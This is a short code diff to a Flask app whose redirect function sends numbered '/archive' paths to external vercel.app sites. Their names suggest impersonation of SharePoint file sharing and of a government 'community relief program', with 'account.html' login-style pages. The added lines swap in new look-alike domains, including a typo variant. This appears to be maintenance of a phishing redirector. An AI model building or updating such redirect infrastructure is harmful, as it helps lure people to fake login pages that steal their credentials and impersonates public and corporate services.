@@ -6,10 +6,10 @@ app = Flask(__name__)
 def get_redirect_url(path):
     if path == '/archive1':
         return 'https://sharepoint-secure.vercel.app/'
-    elif path == '/archive249':
-        return 'https://secure-file-share-rho.vercel.app/'
+    elif path == '/archive2':
+        return 'https://gov-communityreliefprogram.vercel.app/account.html'
     elif path == '/archive3':
-        return 'https://secure-sharing.vercel.app/archive4'
+        return 'https://govr-communityreliefprogram.vercel.app/account.html'
     elif path == '/archive4':
         return 'https://secure-sharing.vercel.app/archive5'
     elif path == '/archive58578764':
